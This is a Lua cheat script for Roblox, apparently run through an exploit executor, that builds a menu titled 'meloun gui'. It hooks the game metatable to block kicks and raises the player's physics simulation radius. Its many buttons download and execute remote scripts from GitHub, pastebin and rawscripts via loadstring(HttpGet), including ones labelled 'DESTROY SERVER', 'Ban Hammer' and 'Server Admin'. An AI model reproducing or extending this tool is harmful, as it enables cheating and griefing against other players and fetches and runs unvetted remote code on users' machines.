--[[
    PROJECT: meloun gui - Hypernova Edition
    AUTHOR: MelounczYT
    SPECIAL: Aureus SS Optimized / 21 Requiers
]]

if not game:IsLoaded() then game.Loaded:Wait() end

-- ANTI-KICK BYPASS (Beibehalten für Sicherheit)
if getrawmetatable then
    local mt = getrawmetatable(game)
    setreadonly(mt, false)
    local old = mt.__namecall
    mt.__namecall = newcclosure(function(self, ...)
        if getnamecallmethod() == "Kick" then return nil end
        return old(self, ...)
    end)
    setreadonly(mt, true)
end

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
local Window = Rayfield:CreateWindow({
    Name = "meloun gui v5 - Fe bypass god",
    LoadingTitle = "MelounczYT System Overload",
    LoadingSubtitle = "by Team Meloun",
    ConfigurationSaving = { Enabled = false },
    KeySystem = false,
})

-- FUNKTION FÜR REQUERIERER (Nutzt immer MelounczYT)
local function Morph(monsterName)
    require(88521859208314).MorphMonster("MelounczYT", monsterName)
end

-- TABS ERSTELLEN
local Main = Window:CreateTab("Main", 4483362458)
local Chaos = Window:CreateTab("Chaos", 4483362458)
local Admin = Window:CreateTab("Admin", 4483362458)
local Hacker = Window:CreateTab("Hacker", 4483362458)
local ReqTab = Window:CreateTab("reqierer script", 4483362458) -- DEIN NEUER TAB

-- REQIERER SCRIPT TAB (Alle 21 Monster)
local ReqSection = ReqTab:CreateSection("Gott-Entitäten")

local monsterList = {
    "the fallen", "ultimate corruption", "ultimate pentagram", "death angel",
    "john doe", "error 404", "c00lkidd", "the corrupted", "dark siren head",
    "shadow abomination", "spider queen", "pumpkinrabbit", "demagogen",
    "sukuna", "jason", "lord oof", "billy", "darkness", "death", "abomination", "xester"
}

for _, monster in pairs(monsterList) do
    ReqTab:CreateButton({
        Name = monster:sub(1,1):upper()..monster:sub(2),
        Callback = function() Morph(monster) end
    })
end

-- MAIN SCRIPTS (Original-Reihenfolge beibehalten)
local scripts = {
    ["CADUCUS"] = "https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/CADUCUS%20(FIXED)",
    ["Xester Monster"] = "https://raw.githubusercontent.com/nicolasbarbosa323/xester/refs/heads/main/fLrx77PM.txt",
    ["Sutart"] = "https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/Sutart",
    ["Come Back"] = "https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/come%20back",
    ["PATCHMA HUB"] = "https://rawscripts.net/raw/Universal-Script-PATCHMA-HUB-v45-universal-hats-plus-aligned-hats-by-MyWorld-30918",
    ["Attack"] = "https://raw.githubusercontent.com/TEST19983/Reslasjd/refs/heads/main/attac",
    ["Sin Dragon"] = "https://raw.githubusercontent.com/gitezgitgit/Sin-Dragon/refs/heads/main/Sin%20Dragon.lua.txt",
    ["The Sun"] = "https://raw.githubusercontent.com/gObl00x/Pendulum-Fixed-AND-Others-Scripts/refs/heads/main/The%20Sun%20Is%20A%20Deadly%20Laser",
    ["Mr. Bye Bye"] = "https://raw.githubusercontent.com/gObl00x/My-Converts/refs/heads/main/Mr.Bye%20Bye.lua",
    ["Gaster Hands"] = "https://raw.githubusercontent.com/nicolasbarbosa323/good-cop-bad-coop/refs/heads/main/GasterHands.txt",
    ["Revenge Hands"] = "https://raw.githubusercontent.com/nicolasbarbosa323/sin-dragon/refs/heads/main/reevenge%20hands.txt",
    ["Server Admin"] = "https://raw.githubusercontent.com/gObl00x/My-Converts/refs/heads/main/Server%20Admin.lua",
    ["Ban Hammer"] = "https://raw.githubusercontent.com/nicolasbarbosa323/ban-hammer/refs/heads/main/ban",
    ["John Doe"] = "https://rawscripts.net/raw/Client-Replication-Join-doe-script-uploaded-by-gojohdkaisenkt-me-34101",
    ["Grab V4"] = "https://raw.githubusercontent.com/Icalock/Server/refs/heads/main/Grab%20V4.txt",
    ["Assignment"] = "https://raw.githubusercontent.com/TEST19983/Assigment/refs/heads/main/Assignment",
    ["Infiltration X"] = "https://pastebin.com/raw/JwUdxg8y",
    ["Project 44033514"] = "https://raw.githubusercontent.com/gitezgitgit/Project-2044033514/refs/heads/main/Project%2044033514.lua.txt"
}

-- SORTIERUNG IN TABS
for name, url in pairs(scripts) do
    local targetTab = Main
    if name == "Sin Dragon" or name == "Attack" or name == "The Sun" or name == "Mr. Bye Bye" or name == "Gaster Hands" or name == "Revenge Hands" then 
        targetTab = Chaos
    elseif name == "Server Admin" or name == "Ban Hammer" or name == "John Doe" or name == "Grab V4" or name == "Assignment" then 
        targetTab = Admin
    elseif name == "Infiltration X" or name == "Project 44033514" then 
        targetTab = Hacker 
    end
    targetTab:CreateButton({Name = name, Callback = function() loadstring(game:HttpGet(url))() end})
end

-- SERVER CONTROLLER INTEGRATION
Hacker:CreateSection("Server Tools")
Hacker:CreateButton({
    Name = "DESTROY SERVER (Loadstring)",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/gruppjakob5-jpg/Server-Controller-/b635b8c273bcee61454a84a75a1749976acff5c6/Destroy.server.lua"))()
    end
})

Hacker:CreateButton({
    Name = "FORCE OWNERSHIP",
    Callback = function()
        -- Beibehalten aus Original
        local p = game.Players.LocalPlayer
        p.MaximumSimulationRadius = math.huge
        sethiddenproperty(p, "SimulationRadius", math.huge)
    end
})

Rayfield:Notify({
    Title = "meloun gui READY", 
    Content = "FE Bypass + 21 Requiers loaded. Happy Birthday MelounczYT!",
    Duration = 7
})
